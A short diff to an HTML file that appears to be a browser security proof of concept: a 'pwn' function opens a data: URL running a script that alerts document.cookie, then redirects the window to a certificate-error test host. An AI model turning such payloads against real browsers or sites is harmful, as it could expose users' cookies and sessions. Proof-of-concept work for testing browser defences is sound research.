@@ -1,7 +1,7 @@
 <html>
 	<script>
 	    pwn = () => {
-	        x = open('javascript:alert()');
+	        x = open('data:text/html;html,<script>alert(document.cookie);</script>');
 		    setTimeout(function(){x.location='https://wrong.host.badssl.com/'}, 3000)
 	        
 	    }
